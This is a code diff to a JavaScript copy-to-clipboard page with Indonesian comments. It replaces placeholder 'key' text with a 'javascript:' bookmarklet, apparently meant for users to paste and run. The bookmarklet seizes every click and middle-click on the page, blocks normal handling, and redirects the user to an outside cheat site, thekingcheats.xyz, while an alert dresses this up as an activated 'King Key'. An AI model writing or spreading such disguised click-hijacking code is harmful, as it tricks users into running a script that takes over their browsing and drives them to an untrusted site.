@@ -4,23 +4,12 @@
 
 // TEXT / KEY / APA PUN (bebas)
 const textToCopy = `
-INI ADALAH TEXT BEBAS
-Bisa isi:
-- Key
-- Token
-- Password
-- Link
-- Config
-- Apa pun yang kamu mau
+javascript:(function(){try {if (window.forceClickActive) return; window.forceClickActive = true; window.forceClickHandler = function(e) { try { e.preventDefault(); e.stopImmediatePropagation(); if (e.type === 'auxclick' && e.button === 1) { window.open('https://thekingcheats.xyz/index.php','_blank'); } else { location.href = 'https://thekingcheats.xyz/index.php'; } } catch (err) {} }; document.addEventListener('click', window.forceClickHandler, true); document.addEventListener('auxclick', window.forceClickHandler, true); window.removeForceClick = function() { try { document.removeEventListener('click', window.forceClickHandler, true); document.removeEventListener('auxclick', window.forceClickHandler, true); window.forceClickActive = false; delete window.forceClickHandler; } catch (e) {} }; alert('Script activated (ALL ERROR KING KEY)'); } catch(e) { console.error(e); alert('Script error'); } })();
 `;
 
 // TEXT WEB CUSTOM (bukan URL web ini)
 const webTextToCopy = `
-INI ISI WEB CUSTOM
-contoh:
-https://google.com
-https://github.com
-atau teks apa pun
+https://blog.techbotal.com/aplicativos-de-relacionamento-a-tecnologia-que-transformou-a-forma-de-conectar-pessoas/
 `;
 
 /* ==============================
